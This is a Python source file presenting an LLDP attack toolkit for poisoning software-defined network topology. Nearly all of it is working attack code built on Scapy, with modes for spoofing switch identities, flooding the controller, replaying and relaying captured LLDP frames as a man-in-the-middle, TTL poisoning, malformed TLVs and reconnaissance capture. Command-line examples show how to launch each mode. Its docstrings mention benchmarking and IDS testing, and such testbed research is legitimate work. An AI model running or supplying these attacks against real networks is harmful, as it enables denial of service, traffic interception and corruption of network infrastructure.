#!/usr/bin/env python3
"""
LLDP Attack Toolkit for SDN Topology Poisoning
Complete attack suite with PCAP export and metadata logging.

Integrates from:
- github.com/Lamonkey/SDN_Topology_Attack (LLDP relay and spoofing)
- github.com/DichHuynh/Topology-Poisoning-Attack-in-SDN (topology poisoning patterns)
- github.com/SySS-Research/WireBug (TLV crafting and malformed packets)
- github.com/profxadke/replay (PCAP replay utility)
- github.com/GoozeyX/python_lldp (LLDP parsing and sniffing)
"""

import argparse
import json
import time
import sys
import os
from datetime import datetime

from scapy.all import Ether, sendp, sniff, wrpcap, rdpcap, Raw, Packet
from scapy.layers.l2 import LLDP, LLDPDUChassisID, LLDPDUPortID, LLDPDUTimeToLive, LLDPDUEndOfLLDPDU
from scapy.layers.l2 import LLDPDUSystemName, LLDPDUSystemDescription, LLDPDUManagementAddress


# LLDP CONSTANTS
# From: IEEE 802.1AB
LLDP_MULTICAST = "01:80:c2:00:00:0e"
LLDP_ETHERTYPE = 0x88cc


# ATTACK METADATA TRACKING
# From: Standard practice for testbed logging
class AttackMetadata:
    """Track attack execution metadata for benchmarking."""

    def __init__(self, attack_type, target_interface):
        self.attack_type = attack_type
        self.target_interface = target_interface
        self.start_time = time.time()
        self.end_time = None
        self.packets_sent = 0
        self.packets_captured = 0
        self.parameters = {}
        self.pcap_file = None

    def finish(self):
        """Mark attack as complete."""
        self.end_time = time.time()

    def to_dict(self):
        """Export metadata to dictionary."""
        return {
            "attack_type": self.attack_type,
            "target_interface": self.target_interface,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "duration_sec": self.end_time - self.start_time if self.end_time else 0,
            "packets_sent": self.packets_sent,
            "packets_captured": self.packets_captured,
            "parameters": self.parameters,
            "pcap_file": self.pcap_file
        }

    def save(self, output_file="attack_meta.json"):
        """Save metadata to JSON file."""
        with open(output_file, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)
        print(f"[+] Metadata saved to {output_file}")


# LLDP PACKET CRAFTING
# From: github.com/SySS-Research/WireBug (TLV construction)
def craft_lldp(chassis_id, port_id, ttl=120, system_name=None, malformed=False):
    """
    Craft LLDP packet with configurable TLVs.

    Args:
        chassis_id: Chassis identifier (MAC address format)
        port_id: Port identifier (string)
        ttl: Time to live in seconds
        system_name: Optional system name TLV
        malformed: If True, create invalid TLV ordering
    """
    # Ethernet header
    eth = Ether(dst=LLDP_MULTICAST, type=LLDP_ETHERTYPE)

    # Mandatory TLVs - From: IEEE 802.1AB Section 9.2.7
    chassis_tlv = LLDPDUChassisID(subtype=4, id=chassis_id.encode())  # MAC address subtype
    port_tlv = LLDPDUPortID(subtype=7, id=port_id.encode())  # Locally assigned subtype
    ttl_tlv = LLDPDUTimeToLive(ttl=ttl)
    end_tlv = LLDPDUEndOfLLDPDU()

    if malformed:
        # Invalid order: TTL before Port ID (violates IEEE 802.1AB)
        lldp = eth / chassis_tlv / ttl_tlv / port_tlv / end_tlv
    else:
        # Valid order: Chassis -> Port -> TTL -> [Optional] -> End
        if system_name:
            system_tlv = LLDPDUSystemName(system_name=system_name.encode())
            lldp = eth / chassis_tlv / port_tlv / ttl_tlv / system_tlv / end_tlv
        else:
            lldp = eth / chassis_tlv / port_tlv / ttl_tlv / end_tlv

    return lldp


# ATTACK MODE 1: LLDP SPOOFING
# From: github.com/Lamonkey/SDN_Topology_Attack (spoofing logic)
def attack_spoof(iface, fake_chassis, fake_port, count=10, interval=1.0, ttl=120, output_pcap=None):
    """
    Spoof LLDP frames with forged chassis and port IDs.
    Creates fake switch identities to poison topology.
    """
    print(f"[*] LLDP Spoofing Attack")
    print(f"    Fake Chassis: {fake_chassis}")
    print(f"    Fake Port: {fake_port}")
    print(f"    Count: {count} | Interval: {interval}s")

    meta = AttackMetadata("spoof", iface)
    meta.parameters = {
        "fake_chassis_id": fake_chassis,
        "fake_port_id": fake_port,
        "ttl": ttl,
        "count": count,
        "interval": interval
    }

    packets = []
    for i in range(count):
        pkt = craft_lldp(fake_chassis, fake_port, ttl=ttl, system_name=f"SPOOFED_SWITCH_{i}")
        sendp(pkt, iface=iface, verbose=False)
        packets.append(pkt)
        meta.packets_sent += 1
        print(f"    [{i+1}/{count}] Sent spoofed LLDP")
        time.sleep(interval)

    meta.finish()

    if output_pcap:
        wrpcap(output_pcap, packets)
        meta.pcap_file = output_pcap
        print(f"[+] Saved {len(packets)} packets to {output_pcap}")

    meta.save()
    return meta


# ATTACK MODE 2: LLDP FLOOD
# From: github.com/DichHuynh/Topology-Poisoning-Attack-in-SDN (flooding patterns)
def attack_flood(iface, chassis_base="aa:bb:cc:dd:ee", count=1000, rate=100, output_pcap=None):
    """
    Flood controller with high-rate LLDP packets.
    Unique chassis IDs to maximize controller state exhaustion.
    """
    print(f"[*] LLDP Flood Attack")
    print(f"    Count: {count} | Rate: {rate} pkt/s")

    meta = AttackMetadata("flood", iface)
    meta.parameters = {
        "chassis_base": chassis_base,
        "count": count,
        "rate_pps": rate
    }

    interval = 1.0 / rate
    packets = []

    for i in range(count):
        # Generate unique chassis ID for each packet
        chassis_id = f"{chassis_base}:{i%256:02x}"
        port_id = f"flood_port_{i}"

        pkt = craft_lldp(chassis_id, port_id, ttl=120)
        sendp(pkt, iface=iface, verbose=False)
        packets.append(pkt)
        meta.packets_sent += 1

        if (i + 1) % 100 == 0:
            print(f"    [{i+1}/{count}] Flooding...")

        time.sleep(interval)

    meta.finish()

    if output_pcap:
        wrpcap(output_pcap, packets)
        meta.pcap_file = output_pcap
        print(f"[+] Saved {len(packets)} packets to {output_pcap}")

    meta.save()
    return meta


# ATTACK MODE 3: LLDP REPLAY
# From: github.com/profxadke/replay (PCAP replay utility)
def attack_replay(iface, pcap_file, count=10, interval=1.0, output_pcap=None):
    """
    Replay captured LLDP packets from PCAP file.
    Useful for replaying legitimate topology to create phantom links.
    """
    print(f"[*] LLDP Replay Attack")
    print(f"    PCAP: {pcap_file}")
    print(f"    Count: {count} | Interval: {interval}s")

    if not os.path.exists(pcap_file):
        print(f"[!] Error: PCAP file not found: {pcap_file}")
        return None

    meta = AttackMetadata("replay", iface)
    meta.parameters = {
        "source_pcap": pcap_file,
        "count": count,
        "interval": interval
    }

    # Read packets from PCAP
    captured = rdpcap(pcap_file)
    lldp_packets = [p for p in captured if p.haslayer(Ether) and p[Ether].type == LLDP_ETHERTYPE]

    if not lldp_packets:
        print(f"[!] No LLDP packets found in {pcap_file}")
        return None

    print(f"    Found {len(lldp_packets)} LLDP packets in capture")

    replayed = []
    for i in range(count):
        # Cycle through captured packets
        pkt = lldp_packets[i % len(lldp_packets)]
        sendp(pkt, iface=iface, verbose=False)
        replayed.append(pkt)
        meta.packets_sent += 1
        print(f"    [{i+1}/{count}] Replayed packet {(i % len(lldp_packets)) + 1}")
        time.sleep(interval)

    meta.finish()

    if output_pcap:
        wrpcap(output_pcap, replayed)
        meta.pcap_file = output_pcap
        print(f"[+] Saved {len(replayed)} packets to {output_pcap}")

    meta.save()
    return meta


# ATTACK MODE 4: LLDP RELAY (MITM)
# From: github.com/Lamonkey/SDN_Topology_Attack (relay attack)
def attack_relay(iface, sniff_iface, duration=60, output_pcap=None):
    """
    Sniff LLDP on one interface and forward to another (MITM).
    Creates fake topology by stitching links between real switches.
    """
    print(f"[*] LLDP Relay Attack (MITM)")
    print(f"    Sniff: {sniff_iface} -> Forward: {iface}")
    print(f"    Duration: {duration}s")

    meta = AttackMetadata("relay", iface)
    meta.parameters = {
        "sniff_interface": sniff_iface,
        "forward_interface": iface,
        "duration_sec": duration
    }

    relayed = []

    def relay_packet(pkt):
        """Callback to relay LLDP packets."""
        if pkt.haslayer(Ether) and pkt[Ether].type == LLDP_ETHERTYPE:
            sendp(pkt, iface=iface, verbose=False)
            relayed.append(pkt)
            meta.packets_sent += 1
            print(f"    [Relay] Forwarded LLDP packet ({len(relayed)} total)")

    print(f"    Sniffing LLDP on {sniff_iface}...")
    sniff(iface=sniff_iface, prn=relay_packet, timeout=duration,
          filter=f"ether proto 0x{LLDP_ETHERTYPE:04x}", store=False)

    meta.finish()

    if output_pcap:
        wrpcap(output_pcap, relayed)
        meta.pcap_file = output_pcap
        print(f"[+] Saved {len(relayed)} packets to {output_pcap}")

    meta.save()
    return meta


# ATTACK MODE 5: TTL POISONING
# From: github.com/SySS-Research/WireBug (TTL manipulation)
def attack_ttl_poison(iface, chassis_id, port_id, ttl_value=0, count=10, interval=1.0, output_pcap=None):
    """
    Send LLDP with invalid TTL values (0 or 65535).
    TTL=0 causes immediate timeout, TTL=65535 causes long-lived phantom entries.
    """
    print(f"[*] LLDP TTL Poisoning Attack")
    print(f"    TTL: {ttl_value} | Count: {count}")

    meta = AttackMetadata("ttl_poison", iface)
    meta.parameters = {
        "chassis_id": chassis_id,
        "port_id": port_id,
        "malicious_ttl": ttl_value,
        "count": count,
        "interval": interval
    }

    packets = []
    for i in range(count):
        pkt = craft_lldp(chassis_id, port_id, ttl=ttl_value, system_name="TTL_POISON")
        sendp(pkt, iface=iface, verbose=False)
        packets.append(pkt)
        meta.packets_sent += 1
        print(f"    [{i+1}/{count}] Sent TTL={ttl_value} LLDP")
        time.sleep(interval)

    meta.finish()

    if output_pcap:
        wrpcap(output_pcap, packets)
        meta.pcap_file = output_pcap
        print(f"[+] Saved {len(packets)} packets to {output_pcap}")

    meta.save()
    return meta


# ATTACK MODE 6: MALFORMED TLVs
# From: github.com/SySS-Research/WireBug (malformed packet crafting)
def attack_malformed(iface, chassis_id, port_id, count=10, interval=1.0, output_pcap=None):
    """
    Send LLDP with invalid TLV ordering (violates IEEE 802.1AB).
    Tests IDS rule-based validation.
    """
    print(f"[*] LLDP Malformed TLV Attack")
    print(f"    Count: {count} | Interval: {interval}s")

    meta = AttackMetadata("malformed", iface)
    meta.parameters = {
        "chassis_id": chassis_id,
        "port_id": port_id,
        "count": count,
        "interval": interval
    }

    packets = []
    for i in range(count):
        pkt = craft_lldp(chassis_id, port_id, ttl=120, malformed=True)
        sendp(pkt, iface=iface, verbose=False)
        packets.append(pkt)
        meta.packets_sent += 1
        print(f"    [{i+1}/{count}] Sent malformed LLDP (invalid TLV order)")
        time.sleep(interval)

    meta.finish()

    if output_pcap:
        wrpcap(output_pcap, packets)
        meta.pcap_file = output_pcap
        print(f"[+] Saved {len(packets)} packets to {output_pcap}")

    meta.save()
    return meta


# ATTACK MODE 7: LLDP CAPTURE
# From: github.com/GoozeyX/python_lldp (LLDP sniffing)
def attack_capture(iface, duration=60, output_pcap="captured.pcap"):
    """
    Capture LLDP packets for later replay.
    Useful for reconnaissance before launching attacks.
    """
    print(f"[*] LLDP Capture Mode")
    print(f"    Interface: {iface}")
    print(f"    Duration: {duration}s")

    meta = AttackMetadata("capture", iface)
    meta.parameters = {
        "duration_sec": duration
    }

    print(f"    Capturing LLDP packets...")
    captured = sniff(iface=iface, timeout=duration,
                     filter=f"ether proto 0x{LLDP_ETHERTYPE:04x}")

    meta.packets_captured = len(captured)
    meta.finish()

    wrpcap(output_pcap, captured)
    meta.pcap_file = output_pcap
    print(f"[+] Captured {len(captured)} LLDP packets")
    print(f"[+] Saved to {output_pcap}")

    meta.save()
    return meta


# COMMAND LINE INTERFACE
def main():
    parser = argparse.ArgumentParser(
        description="LLDP Attack Toolkit for SDN Topology Poisoning",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  spoof      - Forge chassis and port IDs
  flood      - High-rate LLDP packet flood
  replay     - Replay captured LLDP from PCAP
  relay      - MITM relay between interfaces
  ttl        - TTL poisoning (0 or 65535)
  malformed  - Invalid TLV ordering
  capture    - Capture LLDP for reconnaissance

Examples:
  # Spoof fake switch
  ./scapy_lldp_attacks.py spoof -i eth0 -c aa:bb:cc:dd:ee:ff -p eth1 --count 100

  # Flood controller
  ./scapy_lldp_attacks.py flood -i eth0 --count 1000 --rate 50

  # Replay from PCAP
  ./scapy_lldp_attacks.py replay -i eth0 --pcap captured.pcap --count 50

  # Relay (MITM)
  ./scapy_lldp_attacks.py relay -i eth0 --sniff-iface eth1 --duration 120

  # TTL poisoning
  ./scapy_lldp_attacks.py ttl -i eth0 -c aa:bb:cc:dd:ee:ff -p eth1 --ttl 0

  # Malformed TLVs
  ./scapy_lldp_attacks.py malformed -i eth0 -c aa:bb:cc:dd:ee:ff -p eth1

  # Capture LLDP
  ./scapy_lldp_attacks.py capture -i eth0 --duration 60 --output captured.pcap
        """
    )

    parser.add_argument("mode", choices=["spoof", "flood", "replay", "relay", "ttl", "malformed", "capture"],
                        help="Attack mode")
    parser.add_argument("-i", "--iface", required=True, help="Network interface")
    parser.add_argument("-c", "--chassis", help="Chassis ID (MAC format)")
    parser.add_argument("-p", "--port", help="Port ID (string)")
    parser.add_argument("--count", type=int, default=10, help="Number of packets (default: 10)")
    parser.add_argument("--interval", type=float, default=1.0, help="Interval between packets in seconds (default: 1.0)")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second for flood (default: 100)")
    parser.add_argument("--ttl", type=int, default=0, help="TTL value for ttl mode (default: 0)")
    parser.add_argument("--pcap", help="PCAP file for replay mode")
    parser.add_argument("--sniff-iface", help="Interface to sniff from (relay mode)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (relay/capture modes)")
    parser.add_argument("-o", "--output", help="Output PCAP file (default: attack_<mode>.pcap)")

    args = parser.parse_args()

    # Default output PCAP
    if args.output is None:
        args.output = f"attack_{args.mode}.pcap"

    print(f"\n{'='*60}")
    print(f"LLDP Attack Toolkit")
    print(f"{'='*60}\n")

    try:
        if args.mode == "spoof":
            if not args.chassis or not args.port:
                print("[!] Error: --chassis and --port required for spoof mode")
                return 1
            attack_spoof(args.iface, args.chassis, args.port, args.count, args.interval, output_pcap=args.output)

        elif args.mode == "flood":
            attack_flood(args.iface, count=args.count, rate=args.rate, output_pcap=args.output)

        elif args.mode == "replay":
            if not args.pcap:
                print("[!] Error: --pcap required for replay mode")
                return 1
            attack_replay(args.iface, args.pcap, args.count, args.interval, output_pcap=args.output)

        elif args.mode == "relay":
            if not args.sniff_iface:
                print("[!] Error: --sniff-iface required for relay mode")
                return 1
            attack_relay(args.iface, args.sniff_iface, args.duration, output_pcap=args.output)

        elif args.mode == "ttl":
            if not args.chassis or not args.port:
                print("[!] Error: --chassis and --port required for ttl mode")
                return 1
            attack_ttl_poison(args.iface, args.chassis, args.port, args.ttl, args.count, args.interval, output_pcap=args.output)

        elif args.mode == "malformed":
            if not args.chassis or not args.port:
                print("[!] Error: --chassis and --port required for malformed mode")
                return 1
            attack_malformed(args.iface, args.chassis, args.port, args.count, args.interval, output_pcap=args.output)

        elif args.mode == "capture":
            attack_capture(args.iface, args.duration, args.output)

        print(f"\n[+] Attack completed successfully")
        return 0

    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
